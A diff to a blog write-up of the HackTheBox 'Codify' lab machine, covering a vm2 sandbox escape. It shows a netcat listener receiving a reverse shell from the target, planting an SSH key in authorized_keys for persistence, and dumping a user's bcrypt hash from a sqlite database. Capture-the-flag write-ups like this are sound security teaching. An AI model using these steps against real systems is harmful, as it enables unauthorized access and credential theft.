@@ -2,7 +2,7 @@
 title: HackTheBox - Codify write up
 date: 2023-11-28 22:19:00 +0100
 categories: [HackTheBox]
-tags: [HackTheBox, Node.js, vm2, sqlite]
+tags: [HackTheBox, Node.js, vm2, sqlite, SNYK-JS-VM2-5537100]
 render_with_liquid: false
 ---
 
@@ -106,3 +106,58 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 22.43 seconds
 ```
 
+![index](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/codify/index.png)
+
+it appears that the website is some kinda sandbox to run `node js` application with some limitations such as blacklisting some modules that allows us to run OS commands
+
+![limitations](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/codify/limitations.png)
+
+of course, one should never take these things at face value and manual tests are are must so I scrambled some test that tries to run commands but none of it worked, I could only get some basic info about the machine using the `os` model such as the architecture, the `tmpdir` ..
+
+
+![editor](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/codify/editor.png)
+
+moving on, browsing to `/about` tells you that the website uses vm2 library that is `widely used and trusted tool for sandboxing JavaScript`, looking it up, I found this (sandbox bypass)[https://security.snyk.io/vuln/SNYK-JS-VM2-5537100] that allows us to run code from any potential blacklisted library using the view allowed ones
+
+
+![rce](https://raw.githubusercontent.com/0x00Jeff/0x00Jeff.github.io/master/assets/htb/codify/rce.png)
+
+```bash
+$ nc -lnvp 1000
+Connection from 10.10.11.239:59734
+bash: cannot set terminal process group (1252): Inappropriate ioctl for device
+bash: no job control in this shell
+svc@codify:~$ ls .ssh
+ls .ssh
+ls: cannot access '.ssh': No such file or directory
+svc@codify:~$ mkdir .ssh
+mkdir .ssh
+svc@codify:~$ echo '[MY_SSH_PUBLIC_KEY]' > .ssh/authorized_keys
+echo '[MY_SSH_PUBLIC_KEY]' > .ssh/authorized_keys
+svc@codify:~$ ^CExiting.
+(14:23:14) [ archiso@jeff | ~ ]
+$ ssh svc@codify.htb
+Enter passphrase for key '/home/jeff/.ssh/id_rsa':
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
+
+svc@codify:~$
+```
+
+# joshua
+
+looking around I found an sqlite3 database with `joshua`'s password laying in `/var/www/contact`
+
+```bash
+svc@codify:/var/www/contact$ ls
+index.js  open  package.json  package-lock.json  templates  tickets.db
+svc@codify:/var/www/contact$ file tickets.db
+tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
+svc@codify:/var/www/contact$ sqlite3 tickets.db
+SQLite version 3.37.2 2022-01-06 13:25:41
+Enter ".help" for usage hints.
+sqlite> .tables
+tickets  users
+sqlite> select * from users;
+3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+sqlite>
+```
